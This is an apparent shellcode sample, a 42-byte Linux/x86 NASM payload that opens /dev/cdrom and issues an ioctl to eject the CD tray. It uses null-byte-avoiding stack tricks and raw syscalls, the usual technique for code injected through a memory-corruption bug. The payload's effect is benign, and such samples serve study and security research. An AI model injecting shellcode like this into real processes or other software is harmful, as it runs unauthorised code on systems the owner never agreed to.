; linux/x86 eject /dev/cdrom 42 bytes
; root@thegibson
; 2010-01-08

section .text
	global _start

_start:
	; open("/dev/cdrom", O_RDONLY | O_NONBLOCK);
	mov al, 5
	cdq
	push edx
	push word 0x6d6f
	push dword 0x7264632f
	push dword 0x7665642f
	mov ebx, esp
	mov cx, 0xfff
	sub cx, 0x7ff
	int 0x80

	; ioctl(fd, CDROMEJECT, 0);
	mov ebx, eax
	mov al, 54
	mov cx, 0x5309
	cdq
	int 0x80